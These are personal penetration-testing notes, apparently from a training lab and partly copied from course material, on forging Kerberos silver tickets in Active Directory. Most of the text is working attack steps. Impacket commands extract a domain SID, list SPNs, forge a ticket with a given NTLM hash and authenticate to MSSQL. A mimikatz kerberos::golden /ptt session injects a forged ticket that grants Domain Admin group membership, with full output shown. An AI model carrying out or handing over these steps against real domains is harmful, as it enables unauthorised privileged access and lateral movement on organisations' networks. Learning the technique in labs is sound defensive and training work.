### Ticketer
To generate a Silver ticket we need 3 resources:
* NTLM Hash 
* DC SID
* SPN

### Getting NTLM Hash
If we don't have the NTLM Hash but we have the password we can generate the hash with this tool: [NTLM Hash Generator](https://codebeautify.org/ntlm-hash-generator)
![[Pasted image 20230122000844.png]]

### Extracting DC SID
We can use the following command:
```bash
impacket-getPac scrm.local/ksimpson:ksimpson -targetUser Administrator
```

### Getting the SPN
(-k option is needed only if NTLM authentication is disabled)
```bash
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-ip dc1.scrm.local
```

### Generating the Silver Ticket:
```bash
impacket-ticketer -spn MSSQLSvc/dc1.scrm.local -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -dc-ip dc1.scrm.local Administrator -domain scrm.local
```

### Using ticket with any impacket utility
We can export the Administrator.ccache file generated so we can use it with any impacket utility:
```bash
export KRB5CCNAME=Administrator.ccache
```
As shown below:
```bash
impacket-mssqlclient dc1.scrm.local -k                                                                                                                                                             
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL>
```
Examples:
[[Scramble#^ac1e1e]]

Resources:
[SilverTicket Explanation S4vitar Minuto 1:20:00](https://www.youtube.com/watch?v=osmFGqnFe8c&ab_channel=S4viOnLive%28BackupDirectosdeTwitch%29):
![[Pasted image 20230122223446.png]]

In the previous section, we used the overpass the hash technique (along with the captured NTLM hash) to acquire a Kerberos TGT, allowing us to authenticate using Kerberos. We can only use the TGT on the machine it was created for, but the TGS potentially offers more flexibility.

The _Pass the Ticket_ attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.

So far, this attack does not provide us with any additional access, but it does offer flexibility in being able to choose which machine to use the ticket from. However, if a service is registered with a service principal name, this scenario becomes more interesting.

Previously, we demonstrated that we could crack the service account password hash and obtain the password from the service ticket. This password could then be used to access resources available to the service account.

However, if the service account is not a local administrator on any servers, we would not be able to perform lateral movement using vectors such as pass the hash or overpass the hash and therefore, in these cases, we would need to use a different approach.

As with Pass the Hash, Overpass the Hash also requires access to the special admin share called Admin$, which in turn requires local administrative rights on the target machine.

Remembering the inner workings of the Kerberos authentication, the application on the server executing in the context of the service account checks the user's permissions from the group memberships included in the service ticket. The user and group permissions in the service ticket are not verified by the application though. The application blindly trusts the integrity of the service ticket since it is encrypted with a password hash - in theory - only known to the service account and the domain controller.

As an example, if we authenticate against an IIS server that is executing in the context of the service account _iis_service_, the IIS application will determine which permissions we have on the IIS server depending on the group memberships present in the service ticket.

However, with the service account password or its associated NTLM hash at hand, we can forge our own service ticket to access the target resource (in our example the IIS application) with any permissions we desire. This custom-created ticket is known as a _silver ticket_ and if the service principal name is used on multiple servers, the silver ticket can be leveraged against them all.

Mimikatz can craft a silver ticket and inject it straight into memory through the (somewhat misleading) kerberos::golden command. We will explain this apparent misnaming later in the module.

To create the ticket, we first need the obtain the so-called _Security Identifier_ or _SID_ of the domain. A SID is an unique name for any object in Active Directory and has the following structure:

```
S-R-I-S
```

Within this structure, the SID begins with a literal "S" to identify the string as a SID, followed by a _revision level_ (usually set to "1"), an _identifier-authority_ value (often "5" within AD) and one or more _subauthority_ values.

For example, an actual SID may look like this:

```
S-1-5-21-2536614405-3629634762-1218571035-1116
```

The first values in above ("S-1-5") are fairly static within AD. The _subauthority_ value is dynamic and consists of two primary parts: the domain's _numeric identifier_ (in this case "21-2536614405-3629634762-1218571035") and a _relative identifier_ or _RID_ representing the specific object in the domain (in this case "1116").

The combination of the domain's value and the relative identifier help ensure that each SID is unique.

We can easily obtain the SID of our current user with the whoami /user command and then extract the domain SID part from it. Let's try to do this on our Windows 10 client:

```
C:\>whoami /user

USER INFORMATION
----------------

User Name   SID
=========== ==============================================
corp\offsec S-1-5-21-1602875587-2787523311-2599479668-1103
```

The SID defining the domain is the entire string except the RID at the end ( _-1103_ ) .

Now that we have the domain SID, let's try to craft a silver ticket for the IIS service we previously discovered in our dedicated lab domain.

The silver ticket command requires a username (/user), domain name (/domain), the domain SID (/sid), which is highlighted above, the fully qualified host name of the service (/target), the service type (/service:HTTP), and the password hash of the iis_service service account (/rc4).

Finally, the generated silver ticket is injected directly into memory with the /ptt flag.

Before running this, we will flush any existing Kerberos tickets with kerberos::purge and verify the purge with kerberos::list:

```
mimikatz # kerberos::purge
Ticket(s) purge for current session is OK

mimikatz # kerberos::list

mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
User      : offsec
Domain    : corp.com (CORP)
SID       : S-1-5-21-1602875587-2787523311-2599479668
User Id   : 500
Groups Id : \*513 512 520 518 519
ServiceKey: e2b475c11da2a0748290d87aa966c327 - rc4_hmac_nt
Service   : HTTP
Target    : CorpWebServer.corp.com
Lifetime  : 13/02/2018 10.18.42 ; 11/02/2028 10.18.42 ; 11/02/2028 10.18.42
-> Ticket : \*\* Pass The Ticket \*\*

 \* PAC generated
 \* PAC signed
 \* EncTicketPart generated
 \* EncTicketPart encrypted
 \* KrbCred generated

Golden ticket for 'offsec @ corp.com' successfully submitted for current session

mimikatz # kerberos::list

[00000000] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 13/02/2018 10.18.42 ; 11/02/2028 10.18.42 ; 11/02/2028 10.18.42
   Server Name       : HTTP/CorpWebServer.corp.com @ corp.com
   Client Name       : offsec @ corp.com
   Flags 40a00000    : pre_authent ; renewable ; forwardable ;
```

As shown by the output in Listing 49, a new service ticket for the SPN _HTTP/CorpWebServer.corp.com_ has been loaded into memory and Mimikatz set appropriate group membership permissions in the forged ticket. From the perspective of the IIS application, the current user will be both the built-in local administrator ( _Relative Id: 500_ ) and a member of several highly-privileged groups, including the Domain Admins group (as highlighted above).

To create a silver ticket, we use the password hash and not the cleartext password. If a kerberoast session presented us with the cleartext password, we must hash it before using it to generate a silver ticket.

Now that we have this ticket loaded into memory, we can interact with the service and gain access to any information based on the group memberships we put in the silver ticket. Depending on the type of service, it might also be possible to obtain code execution.